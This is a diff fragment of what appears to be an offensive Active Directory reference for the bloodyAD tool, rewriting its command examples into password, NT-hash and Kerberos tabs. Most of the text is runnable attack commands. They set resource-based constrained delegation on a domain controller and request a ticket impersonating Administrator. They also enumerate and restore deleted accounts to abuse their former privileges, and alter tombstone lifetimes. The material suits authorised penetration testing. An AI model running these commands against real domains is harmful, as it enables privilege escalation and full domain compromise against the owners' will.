-bloodyAD -c ":dc01.pem" -u 'DC01$' -d $DOMAIN --host $DC_HOST \
-  add rbcd 'DC01$' 'attacker$'
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      get object "DC=$DOMAIN,DC=local" --attr msDS-Behavior-Version
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      get object "DC=$DOMAIN,DC=local" --attr msDS-Behavior-Version
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      get object "DC=$DOMAIN,DC=local" --attr msDS-Behavior-Version
+    ```
+  </Tab>
+</Tabs>
 
+**Step 6: Set RBCD on the DC to impersonate DA via S4U2Proxy.**
+
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Step 6: Set RBCD on the DC to impersonate DA via S4U2Proxy
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      add rbcd 'DC01$' 'attacker$'
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # Step 6: Set RBCD on the DC to impersonate DA via S4U2Proxy
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      add rbcd 'DC01$' 'attacker$'
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # Step 6: Set RBCD on the DC to impersonate DA via S4U2Proxy
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      add rbcd 'DC01$' 'attacker$'
+    ```
+  </Tab>
+</Tabs>
+
+```bash wrap
 getST.py $DOMAIN/'attacker$':$COMP_PASS \
   -spn cifs/DC01.$DOMAIN \
   -impersonate Administrator \
@@ -469,30 +1236,84 @@ When the AD Recycle Bin is enabled, deleted objects are preserved as tombstones 
 
 The LDAP control OID `1.2.840.113556.1.4.2064` unlocks visibility of deleted, tombstoned, and recycled objects in queries.
 
-```bash wrap
-# List all deleted objects (names only)
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  get search -c 1.2.840.113556.1.4.2064 \
-  --filter '(isDeleted=TRUE)' --attr name
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # List all deleted objects (names only)
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      get search -c 1.2.840.113556.1.4.2064 \
+      --filter '(isDeleted=TRUE)' --attr name
 
-# Read the DACL on the Deleted Objects container to check your permissions
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  get object 'DC=$DOMAIN,DC=local' --attr ntsecuritydescriptor --resolve-sd
+    # Read the DACL on the Deleted Objects container to check your permissions
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      get object 'DC=$DOMAIN,DC=local' --attr ntsecuritydescriptor --resolve-sd
 
-# Check which deleted objects your user can write (requires --include-del)
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  get writable --include-del
-```
+    # Check which deleted objects your user can write (requires --include-del)
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      get writable --include-del
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # List all deleted objects (names only)
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      get search -c 1.2.840.113556.1.4.2064 \
+      --filter '(isDeleted=TRUE)' --attr name
+
+    # Read the DACL on the Deleted Objects container to check your permissions
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      get object 'DC=$DOMAIN,DC=local' --attr ntsecuritydescriptor --resolve-sd
+
+    # Check which deleted objects your user can write (requires --include-del)
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      get writable --include-del
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # List all deleted objects (names only)
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      get search -c 1.2.840.113556.1.4.2064 \
+      --filter '(isDeleted=TRUE)' --attr name
+
+    # Read the DACL on the Deleted Objects container to check your permissions
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      get object 'DC=$DOMAIN,DC=local' --attr ntsecuritydescriptor --resolve-sd
+
+    # Check which deleted objects your user can write (requires --include-del)
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      get writable --include-del
+    ```
+  </Tab>
+</Tabs>
 
 ### Restore a Tombstoned Object
 
 Reanimation requires the `Reanimate Tombstones` extended right on the domain naming context, or ownership of the deleted object. Restore by SID (shown in the deleted object's `objectSid` attribute).
 
-```bash wrap
-# Restore a tombstoned object by its SID
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  set restore 'S-1-5-21-...-<RID>'
-```
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Restore a tombstoned object by its SID
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      set restore 'S-1-5-21-...-<RID>'
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # Restore a tombstoned object by its SID
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      set restore 'S-1-5-21-...-<RID>'
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # Restore a tombstoned object by its SID
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      set restore 'S-1-5-21-...-<RID>'
+    ```
+  </Tab>
+</Tabs>
 
 After restoration the account is disabled and has no group memberships. Re-enable it, set a new password, and add it to the relevant groups to abuse any privileges it originally held.
 
@@ -500,22 +1321,62 @@ After restoration the account is disabled and has no group memberships. Re-enabl
 
 These attributes control how long objects remain accessible after deletion.
 
-```bash wrap
-# View current tombstone and deleted object lifetimes
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  get object 'CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=$DOMAIN,DC=local' \
-  --attr tombstoneLifetime,msDS-DeletedObjectLifetime
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # View current tombstone and deleted object lifetimes
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      get object 'CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=$DOMAIN,DC=local' \
+      --attr tombstoneLifetime,msDS-DeletedObjectLifetime
 
-# Modify tombstone lifetime (days; requires Domain Admin / write on the DS config object)
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  set object 'CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=$DOMAIN,DC=local' \
-  tombstoneLifetime -v 60
+    # Modify tombstone lifetime (days; requires Domain Admin / write on the DS config object)
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      set object 'CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=$DOMAIN,DC=local' \
+      tombstoneLifetime -v 60
 
-# Modify deleted object lifetime separately (Recycle Bin retention period)
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  set object 'CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=$DOMAIN,DC=local' \
-  msDS-DeletedObjectLifetime -v 30
-```
+    # Modify deleted object lifetime separately (Recycle Bin retention period)
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      set object 'CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=$DOMAIN,DC=local' \
+      msDS-DeletedObjectLifetime -v 30
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # View current tombstone and deleted object lifetimes
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      get object 'CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=$DOMAIN,DC=local' \
+      --attr tombstoneLifetime,msDS-DeletedObjectLifetime
+
+    # Modify tombstone lifetime (days; requires Domain Admin / write on the DS config object)
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      set object 'CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=$DOMAIN,DC=local' \
+      tombstoneLifetime -v 60
+
+    # Modify deleted object lifetime separately (Recycle Bin retention period)
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      set object 'CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=$DOMAIN,DC=local' \
+      msDS-DeletedObjectLifetime -v 30
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # View current tombstone and deleted object lifetimes
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      get object 'CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=$DOMAIN,DC=local' \
+      --attr tombstoneLifetime,msDS-DeletedObjectLifetime
+
+    # Modify tombstone lifetime (days; requires Domain Admin / write on the DS config object)
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      set object 'CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=$DOMAIN,DC=local' \
+      tombstoneLifetime -v 60
+
+    # Modify deleted object lifetime separately (Recycle Bin retention period)
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      set object 'CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=$DOMAIN,DC=local' \
+      msDS-DeletedObjectLifetime -v 30
+    ```
+  </Tab>
+</Tabs>
 
 ## Global Flags Reference
 
